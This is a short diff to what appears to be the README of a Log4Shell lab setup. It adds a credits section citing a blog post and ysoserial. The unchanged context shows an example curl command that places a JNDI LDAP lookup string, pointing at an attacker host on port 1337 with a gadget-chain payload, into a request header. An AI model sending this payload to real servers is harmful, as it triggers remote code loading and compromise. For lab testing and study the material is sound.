@@ -22,3 +22,8 @@ docker-compose up
 
 #### Example
 `curl  -H '<some-header or other property you're testing> : ${jndi:ldap://<host.ip.address>:1337/<gadget chain payload>}' http://target.hostname/some/endpoint`
+
+
+## Credits
+
+This is based almost entirely on the work shared [here](https://www.cnblogs.com/yyhuni/p/15088134.html) ([english version](https://www.cnblogs.com/yyhuni/p/15088134.html)), as well as [ysoserial](https://github.com/frohoff/ysoserial).
